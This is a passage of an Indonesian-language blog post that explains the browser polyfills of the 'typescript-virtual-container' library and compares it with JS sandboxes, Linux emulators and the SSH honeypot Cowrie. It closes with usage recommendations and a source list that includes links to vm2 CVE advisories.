Inilah alasan mengapa snapshot VFS bertahan dari reload halaman di browser -- seluruh biner `.vfsb` ditulis ke IndexedDB melalui polyfill ini, dan dibaca kembali pada pemuatan berikutnya. Tanpa Wasm. Tanpa server. Hanya IndexedDB, yang sudah ada di semua browser sejak sekitar tahun 2011.

**`node:crypto` -- SHA-256 dalam JS murni**

Alih-alih mengimpor library crypto Wasm, polyfill crypto mengimplementasikan SHA-256 dari awal menggunakan konstanta putaran FIPS 180-4. 166 baris JS murni dengan dukungan penuh untuk output hex/base64/Uint8Array. Semua hashing di library melewati ini -- sidik jari kunci host SSH, checksum internal, semuanya. Ringkas, tanpa dependensi, berfungsi.

**`node:os` -- membaca perangkat keras browser asli**

Yang ini sentuhan yang bagus. Alih-alih mengembalikan nilai palsu yang dikodekan keras, `node:os` membaca `navigator.deviceMemory` untuk RAM total dan `navigator.hardwareConcurrency` untuk jumlah CPU. Jadi `neofetch` di build browser benar-benar melaporkan sesuatu yang sesuai dengan mesin aslimu -- bukan stub palsu `2 core, 2 GB RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB default
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // juga mem-parsing navigator.userAgent untuk menebak string model CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- stub yang jujur**

Browser tidak dapat membuka soket TCP atau menjalankan SSH asli, jadi ini adalah stub yang melempar `NotImplemented` dengan pesan yang jelas jika ada yang mencoba menggunakannya. Tidak ada kegagalan diam-diam, tidak ada `undefined` yang dikembalikan di mana objek diharapkan. Hanya pesan keras dan jelas "ini tidak berfungsi di browser" -- yang persis seperti yang kamu inginkan.

**`process.js` dan `buffer.js` -- global yang diinjeksikan**

Keduanya diinjeksikan di bagian atas setiap file bundel melalui opsi `inject` esbuild, sehingga `process` dan `Buffer` tersedia secara global tanpa import eksplisit. `process.js` sangat kecil: `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` adalah implementasi ulang lengkap dari `Buffer` di atas `Uint8Array` -- semua metode `readUInt32BE`, `writeInt16LE`, encoding hex/base64 yang menjadi sandaran implementasi SSH dan VFS.

---

Keseluruhan polyfill sekitar 640 baris JS yang ditulis tangan. Tidak ada paket npm. Tidak ada Wasm. Dan hasilnya adalah bundel browser yang hanya library, berjalan secara native, tanpa kecemasan "tapi apakah ini benar-benar berfungsi di browser?" yang biasa kamu dapatkan dengan library yang dirancang untuk Node terlebih dahulu. Layak untuk melihat direktori `polyfills/` di repositori jika kamu penasaran -- setiap file terkandung dengan baik dan dapat dibaca sendiri, yang merupakan pilihan gaya yang sangat saya hargai.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Kategori** | JS Sandbox | JS Sandbox | JS Sandbox | Emulator | Emulator | Node.js/Wasm | Honeypot | Simulator |
| **Mengisolasi JS** | ⚠️ lingkup | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | sebagian | n/a | ✅ Worker |
| **Kernel Linux asli** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Interpreter shell** | ❌ | ❌ | ❌ | ✅ (asli) | ✅ (asli) | ✅ (asli) | sebagian | ✅ (kustom) |
| **~170 perintah Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | sebagian | ~20 | ✅ |
| **Izin POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | sebagian | ✅ ditegakkan |
| **Manajemen pengguna** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ lengkap |
| **Server SSH asli** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/snapshot VFS** | ❌ | ❌ | ❌ | terbatas | ❌ | ❌ | ❌ | ✅ |
| **Jaringan virtual L2/L3** | ❌ | ❌ | ❌ | dasar | ❌ | ❌ | ❌ | ✅ lengkap |
| **VPN virtual** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Dukungan browser** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js asli** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API diketik** | dasar | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ lengkap |
| **Kompatibilitas biner** | n/a | n/a | n/a | ✅ | ✅ | sebagian | n/a | ❌ |
| **Waktu boot** | instan | instan | instan | 15-40d | 15-40d | 2-5d | instan | <1d |
| **RAM/instance** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Dependensi runtime** | 0 | 1 (native) | 1 (Wasm) | 0 | proprietary | 1 | dependensi Python | 3 (ssh2, ws, fflate) |
| **Status** | stabil | ✅ aktif | ✅ aktif | ✅ sangat aktif | komersial | ✅ aktif | ✅ aktif | ✅ aktif |

---

## Kapan menggunakan apa

**Kamu perlu menjalankan JavaScript tidak terpercaya -- formula yang dikirimkan pengguna, plugin, hook skrip.**  
→ `isolated-vm`. V8 Isolate asli, batas memori ketat, jembatan komunikasi eksplisit. Hindari `vm2` -- daftar CVE hanya terus bertambah, serius ini seperti yang baru setiap beberapa bulan. Hindari `vm` -- itu sama sekali bukan sandbox, tolong.

**Kamu perlu mengisolasi JS dan tidak ingin ekstensi native, atau membutuhkan kompatibilitas browser.**  
→ `quickjs-emscripten`. Batas Wasm, modul ~500 KB, berfungsi di browser dan Node. Lebih lambat dari V8 tetapi benar-benar terisolasi.

**Kamu perlu mem-boot OS Linux asli yang tidak dimodifikasi dengan kompatibilitas biner.**  
→ `v86` untuk Linux 32-bit, atau `container2wasm` jika kamu memiliki image Docker yang ada. Terima 150 MB+ RAM dan 30 detik boot, itulah dealnya. Jika perlu 64-bit, lihat CheerpX atau gunakan runtime kontainer asli.

**Kamu perlu menyematkan terminal mirip Linux dalam aplikasi web tanpa backend.**  
→ `v86` (OS lengkap, berat, lambat boot) atau bundel browser `typescript-virtual-container` (simulator, lebih ringan, boot instan, menyertakan `startxfce4` untuk desktop lengkap yang cukup keren).

**Kamu membutuhkan tutorial coding interaktif online atau IDE browser.**  
→ WebContainers jika kamu fokus pada ekosistem Node.js. CheerpX jika kamu membutuhkan userspace Linux asli. Bundel browser `typescript-virtual-container` jika kamu menginginkan opsi yang lebih ringan dengan API yang diketik.

**Kamu ingin mengumpulkan TTP penyerang SSH dalam skala besar.**  
→ Cowrie adalah standar produksi, titik. Berjalan di server Linux mana pun, terintegrasi dengan semua SIEM, memiliki mode LLM sekarang. Gunakan saja Cowrie.

**Kamu menginginkan data honeypot SSH dalam aplikasi Node.js dengan API yang dapat diprogram.**  
→ `typescript-virtual-container`. Perintah benar-benar dieksekusi. VFS adalah struktur data nyata yang bisa kamu snapshot dan bedakan secara instan. Penyerang mendapatkan lingkungan interaktif yang meyakinkan, dan kamu mendapatkan data audit terstruktur tanpa meninggalkan Node.

**Kamu membutuhkan otomatisasi shell / pengujian CI tanpa Docker.**  
→ `typescript-virtual-container`. Boot dalam kurang dari satu detik, snapshot sebelum pengujian, restore setelahnya. Menjalankan perintah shell dengan API yang diketik. Tanpa daemon Docker, tanpa kernel, tanpa VM, tanpa menunggu.

**Kamu membutuhkan lingkungan shell multi-penyewa (SaaS, pendidikan, pelatihan).**  
→ `typescript-virtual-container`. 5-20 MB per instance vs. 150-256 MB untuk emulator. 100 pengguna bersamaan: ~2 GB vs. ~25 GB. Itu perbedaan besar dalam biaya hosting!

**Kamu membutuhkan honeypot realistis yang juga memungkinkanmu membangun lab jaringan multi-VM.**  
→ `typescript-virtual-container` adalah satu-satunya hal di ruang ini yang melakukan keduanya.

---

## Apa yang tidak bisa dilakukannya (dan saya ingin jujur tentang ini)

Ia tidak dapat menjalankan biner x86 asli. Jika kamu perlu mengompilasi kode C, menjalankan interpreter Python asli, atau menggunakan perangkat lunak yang dikompilasi untuk Linux, tidak ada ABI kernel untuk mendukung syscall tersebut. Perintah seperti `gcc`, `python3`, dan `node` adalah stub -- mereka merespons `--version` dan panggilan umum, tetapi tidak menjalankan apa pun yang nyata.

Itulah trade-off fundamental: kamu mendapatkan 10-50 kali lebih sedikit memori, boot instan, kompatibilitas browser, API yang diketik, SSH asli, dan jaringan virtual -- dan kamu meninggalkan kompatibilitas biner dengan userspace Linux.

Fortune telah banyak memikirkan hal ini saat merancang proyek. Untuk kasus penggunaan yang dia targetkan -- honeypot, pengujian, terminal tertanam, lingkungan CI -- menjalankan biner yang dikompilasi sebenarnya tidak pernah diperlukan. Pipeline shell, manipulasi file, routing jaringan, dan SSH mencakup semuanya. Tapi jika kasus penggunamu memerlukan perangkat lunak terkompilasi asli, `v86` atau Docker adalah jawaban yang tepat, bukan ini.

---

## Untuk menyimpulkan

Jadi begitulah. Ekosistem ini lebih luas dan lebih terfragmentasi daripada yang terlihat dari luar. `vm` adalah pemisah lingkup, bukan sandbox. `vm2` terus mengumpulkan CVE (sungguh, lihat advisori bulan ini). `isolated-vm` adalah jawaban yang tepat untuk isolasi JS tetapi hanya JS. `quickjs-emscripten` adalah pilihan yang tepat ketika kamu membutuhkan kompatibilitas browser atau ingin menghindari ekstensi native. `v86` dan CheerpX adalah emulator sejati ketika kamu membutuhkan kompatibilitas biner asli. WebContainers adalah Node.js di Wasm, bukan lingkungan Linux serba guna. Cowrie adalah standar emas honeypot SSH, tapi itu Python dan tidak asli Node.

Dan kemudian ada `typescript-virtual-container` -- proyek Fortune -- yang hidup di kategorinya sendiri. Bukan emulator, bukan sandbox JS, bukan honeypot pasif. Sesuatu di antara semuanya yang ternyata sangat berguna untuk banyak hal yang tidak bisa dilakukan yang lain.

`typescript-virtual-container` mengisi celah yang tidak disentuh oleh yang lain: lingkungan shell Linux lengkap dan dapat diprogram dengan SSH asli, SFTP, izin POSIX, manajemen pengguna, jaringan virtual, dan API TypeScript yang diketik -- berjalan di sekitar 10 MB, boot dalam kurang dari satu detik, berfungsi di Node.js dan browser.

Jika kamu ingin mencobanya: kode sumber ada di [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) dan ada demo online (termasuk `startxfce4` untuk desktop lengkap, yang benar-benar keren) di [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Coba lihat dan beri beberapa bintang untuk Fortune di GitHub, dia pantas mendapatkannya!

Terima kasih sudah membaca -- yang ini panjang bahkan untuk standarku :) semoga ini bermanfaat untukmu!

---

## Sumber

Saya mencoba menautkan setiap klaim ke sumber utama -- advisori CVE, dokumen resmi, repositori GitHub, posting blog maintainer. Beberapa catatan: daftar CVE vm2 terus bertambah jadi tautan FortiGuard mungkin sudah usang saat kamu membaca ini (lihat halaman advisori GitHub untuk yang terbaru). Tautan Bellard semuanya stabil -- situs pribadinya sudah ada sejak lama dan kontennya tidak berubah. Dan jika kamu ingin mendalami salah satu polyfill, cukup jelajahi direktori `polyfills/` di repositori `typescript-virtual-container` langsung -- lebih mudah dibaca daripada deskripsi apa pun yang bisa saya tulis di sini.

### JavaScript Sandbox

- **Modul `vm` Node.js** -- dokumentasi resmi: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Peringatan keamanan `vm` Node.js** -- "Modul vm bukan mekanisme keamanan. Jangan gunakan untuk menjalankan kode yang tidak terpercaya": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Kronologi CVE vm2** -- Peringatan FortiGuard dengan daftar lengkap CVE dan tanggal: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Pelarian melalui error async, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Entri Exploit DB dengan PoC lengkap: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** -- 11 pelarian baru, analisis: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- Post-mortem oxeye.io tentang CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internal V8 Isolate** -- Panduan Integrasi: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Mesin QuickJS** -- oleh Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Model izin Deno** -- dok: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Rilis Deno 2** -- Oktober 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **Proposal TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Proposal TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Artikel praktis Andrew Healey tentang pendekatan sandbox Deno: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emulator Linux

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **Matriks dukungan OS v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS yang digunakan v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Ekstensi Bochs VBE** (referensi VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Emulator Bellard: [bellard.org/jslinux](https://bellard.org/jslinux/) · Catatan teknis (TinyEMU, sejarah, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Sumber C: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Mirror GitHub tidak resmi: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Emulator JS OpenRISC: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- dok: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Panduan pthreads: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Dok API: [webcontainers.io](https://webcontainers.io) · Pengumuman: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Ikhtisar InfoQ: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Posting blog NTT: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Artikel Simon Willison: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · situs: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Dok: [docs.cowrie.org](https://docs.cowrie.org) · Situs: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (diarsipkan): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js minimal: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Daftar terkurasi: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Penemuan informasi sistem (bagaimana penyerang mengidentifikasi honeypot): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo online** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Panduan arsitektur** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementasi protokol SSH) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (kompresi snapshot VFS) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (transport shell WebSocket) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Bacaan lebih lanjut

- **Model izin POSIX** -- Spesifikasi Open Group: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (pola yang digunakan dalam persistensi VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Model V8 Isolate** -- "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Spesifikasi ISA RISC-V** (untuk konteks TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Arsitektur OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, kontras yang berguna dengan pendekatan Wasm: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL tentang ukuran bundel quickjs-emscripten: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
